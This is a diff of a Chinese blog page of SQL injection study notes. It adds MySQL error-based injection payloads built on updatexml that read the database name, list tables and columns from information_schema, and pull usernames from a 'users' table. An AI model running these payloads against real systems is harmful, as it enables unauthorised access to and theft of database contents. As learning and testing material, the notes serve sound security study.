@@ -102,8 +102,13 @@
 
 <p>闭合类型为”)。</p>
 <hr>
-<h2 id="报错型："><a href="#报错型：" class="headerlink" title="#报错型："></a>#报错型：</h2><p><code>id=-1 AND (updatexml(1, concat(0x7e, (select user()), 0x7e), 1)) --+</code> <strong>(最基础的)</strong></p>
-<p><code>id=-1&#39; AND (updatexml(1, concat(0x7e, (select user()), 0x7e), 1)) --+</code> <strong>(后端存在单引号)</strong></p>
+<h2 id="报错型："><a href="#报错型：" class="headerlink" title="#报错型："></a>#报错型：</h2><p><code>id=-1 AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+</code> <strong>(最基础的)</strong></p>
+<p><code>id=-1&#39; AND (updatexml(1, concat(0x7e, (database()), 0x7e), 1)) --+</code> <strong>(后端存在单引号)</strong></p>
+<p><code>?id=-1 AND updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=&#39;数据库&#39; limit 0,1), 0x7e), 1) </code> <strong>(查表)</strong></p>
+<p><code>?id=-1 AND updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name=&#39;表&#39; limit 1,1), 0x7e), 1)</code>  <strong>(查对应表的列)</strong></p>
+<p><code>?id=-1 AND updatexml(1, concat(0x7e, (select username from users limit 0,1), 0x7e), 1)</code>  <strong>(查数据)</strong></p>
+<p><strong>注意：</strong></p>
+<p>由于报错注入的特殊性，所有内容都得多次注入后拿全。</p>
 <hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
@@ -113,6 +118,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1766842042766"></script>
+<script src="/js/main.js?v=1766843465949"></script>
 </body>
 </html>
